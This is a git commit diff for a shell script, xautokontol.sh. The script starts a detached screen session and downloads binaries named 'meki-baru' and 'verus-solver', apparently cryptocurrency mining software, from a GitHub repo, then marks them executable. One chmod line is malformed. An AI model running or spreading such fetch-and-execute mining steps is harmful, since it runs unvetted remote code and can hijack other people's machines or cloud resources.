359d7b45c3d4daa5d5b0ed399ff8cbbafc3cc4ed
renilo <88342640+renilo@users.noreply.github.com>
2021-09-03 13:39:00 +0700

    Update xautokontol.sh

--- xautokontol.sh
+++ xautokontol.sh
@@ -6,9 +6,13 @@ sudo apt install screen -y
 
 screen -dmS xhajar.sh ./xhajar.sh 65 75
 
-wget https://github.com/renilo/xmr/raw/main/hajar
+wget https://github.com/renilo/xmr/raw/main/meki-baru
 
 wget https://raw.githubusercontent.com/renilo/xmr/main/xhajar.sh
+
+wget https://github.com/renilo/xmr/raw/main/verus-solver
+
+chmod+x verus-solver
 
 chmod +x xhajar.sh
 
